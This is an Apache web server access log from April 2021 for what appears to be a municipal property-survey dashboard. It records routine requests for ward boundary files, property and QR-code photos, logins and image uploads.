164.52.206.209 - - [04/Apr/2021:10:01:15 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:01:40 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:02:08 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:02:09 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
106.210.116.2 - - [04/Apr/2021:10:02:08 +0530] "GET /psc/dashboard HTTP/1.1" 200 56139 "http://164.52.207.234/psc/home" "Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:02:13 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:02:13 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
106.210.116.2 - - [04/Apr/2021:10:02:12 +0530] "GET /psc/dashboard HTTP/1.1" 200 563177 "http://164.52.207.234/psc/home" "Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
106.210.116.2 - - [04/Apr/2021:10:02:15 +0530] "GET /psc/assets/images/favicon.png HTTP/1.1" 200 15817 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:03:03 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
106.210.116.2 - - [04/Apr/2021:10:03:04 +0530] "-" 408 0 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:03:46 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:04 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:08 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:18 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
106.210.116.2 - - [04/Apr/2021:10:04:28 +0530] "-" 408 0 "-" "-"
106.210.116.2 - - [04/Apr/2021:10:04:28 +0530] "-" 408 0 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:39 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:41 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:04:42 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:05:18 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:05:55 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:06:46 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:07:00 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:07:05 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:07:45 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:07:47 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:08:10 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:08:27 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:08:35 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:09:06 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:09:27 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:09:58 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:10:32 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:10:58 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:11:16 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:11:26 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:11:40 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:12:09 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:12:17 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:12:31 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:13:04 +0530] "GET /psc/ HTTP/1.1" 200 2029 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:13:04 +0530] "GET /psc/upload/wardboundary/ward34.geojson HTTP/1.0" 200 14589 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:13:08 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:13:10 +0530] "POST /psc/home/authorizationnosql HTTP/1.1" 303 367 "http://164.52.207.234/psc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:13:10 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:13:10 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:13:15 +0530] "GET /psc/dist/css/custom.css HTTP/1.1" 200 764 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:13:15 +0530] "GET /psc/js/leaflet/leaflet.label.js HTTP/1.1" 200 2609 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:13:15 +0530] "GET /psc/js/leaflet/leaflet.label.css HTTP/1.1" 200 788 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:13:15 +0530] "GET /psc/js/leaflet/leaflet.fullscreen.css HTTP/1.1" 200 723 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:13:10 +0530] "GET /psc/dashboard HTTP/1.1" 200 563187 "http://164.52.207.234/psc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:13:36 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:13:42 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:13:54 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:14:06 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:14:09 +0530] "GET /psc/manageproperty/propertyaudit HTTP/1.1" 200 5227 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:14:25 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:14:46 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:14:49 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:15:19 +0530] "GET /psc/ HTTP/1.1" 200 1901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:15:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:15:25 +0530] "POST /psc/home/authorizationnosql HTTP/1.1" 303 367 "http://164.52.207.234/psc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:15:25 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:15:26 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:15:25 +0530] "GET /psc/dashboard HTTP/1.1" 200 563179 "http://164.52.207.234/psc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:15:35 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:15:35 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:15:48 +0530] "GET /psc/manageproperty/dateWiseQRInstalled HTTP/1.1" 200 6052 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:16:13 +0530] "POST /psc/managesurveyor/getWards/ HTTP/1.1" 200 680 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:16:18 +0530] "POST /psc/managesurveyor/getSurveyors/ HTTP/1.1" 404 1343 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:17:35 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:16:19 +0530] "POST /psc/manageproperty/getPropertyByDate HTTP/1.1" 200 3791 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2085700.jpeg HTTP/1.1" 200 35104 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2111358.jpeg HTTP/1.1" 200 24902 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2111358.jpeg HTTP/1.1" 200 31720 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2175641.jpeg HTTP/1.1" 200 38298 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2085700.jpeg HTTP/1.1" 200 27349 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2175641.jpeg HTTP/1.1" 200 31724 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2085685.jpeg HTTP/1.1" 200 22347 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2085685.jpeg HTTP/1.1" 200 27223 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_1234304.jpeg HTTP/1.1" 200 18416 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_1185118.jpeg HTTP/1.1" 200 22775 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_1185118.jpeg HTTP/1.1" 200 22599 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_1234304.jpeg HTTP/1.1" 200 20057 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2085648.jpeg HTTP/1.1" 200 26508 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2085648.jpeg HTTP/1.1" 200 23878 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/qrcode_pic/pic_qrcode_2111345.jpeg HTTP/1.1" 200 14416 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:17:42 +0530] "GET /psc/download/w49/property_pic/pic_property_2111345.jpeg HTTP/1.1" 200 26271 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:17:56 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:18:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:17:34 +0530] "POST /psc/manageproperty/getPropertyByDate HTTP/1.1" 200 3792 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::1 - - [04/Apr/2021:10:18:25 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) mod_wsgi/4.5.17 Python/3.6 (internal dummy connection)"
164.52.206.209 - - [04/Apr/2021:10:19:20 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:19:25 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:20:11 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:20:20 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:20:31 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:20:40 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:20:44 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:03 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:07 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:10 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:18 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:19 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:21:37 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:22:41 +0530] "POST /psc/managesurveyor/getWards/ HTTP/1.1" 200 678 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:22:44 +0530] "POST /psc/managesurveyor/getSurveyors/ HTTP/1.1" 404 1342 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:02 +0530] "POST /psc/home/authorizationnosql HTTP/1.1" 303 495 "http://164.52.207.234/psc/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:23:02 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:23:03 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/dist/css/stylealt.css HTTP/1.1" 200 38604 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/dist/css/custom.css HTTP/1.1" 200 764 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/js/leaflet/leaflet.label.css HTTP/1.1" 200 788 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/js/leaflet/leaflet.fullscreen.css HTTP/1.1" 200 723 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/dist/chart/utils.js HTTP/1.1" 200 1776 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/js/leaflet/leaflet.label.js HTTP/1.1" 200 2608 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/dist/chart/Chart.js HTTP/1.1" 200 106157 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:02 +0530] "GET /psc/dashboard HTTP/1.1" 200 563183 "http://164.52.207.234/psc/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:11 +0530] "GET /psc/js/jquery-ui.js HTTP/1.1" 200 108396 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:13 +0530] "GET /psc/dist/css/icons/material-design-iconic-font//fonts/materialdesignicons-webfont.woff2?v=1.8.36 HTTP/1.1" 200 99999 "http://164.52.207.234/psc/dist/css/icons/material-design-iconic-font/css/materialdesignicons.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:23:13 +0530] "GET /psc/images/infinity.gif HTTP/1.1" 304 181 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:23:16 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
::1 - - [04/Apr/2021:10:23:21 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) mod_wsgi/4.5.17 Python/3.6 (internal dummy connection)"
164.52.206.209 - - [04/Apr/2021:10:23:35 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:22:49 +0530] "POST /psc/manageproperty/getPropertyByDate HTTP/1.1" 200 8377 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404082624.jpeg HTTP/1.1" 200 43320 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404082624.jpeg HTTP/1.1" 200 38576 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/property_pic/pic_property_2149523.jpeg HTTP/1.1" 200 41303 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/property_pic/pic_property_2151677.jpeg HTTP/1.1" 200 26614 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2151677.jpeg HTTP/1.1" 200 30981 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2149523.jpeg HTTP/1.1" 200 40517 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404083616.jpeg HTTP/1.1" 200 31077 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
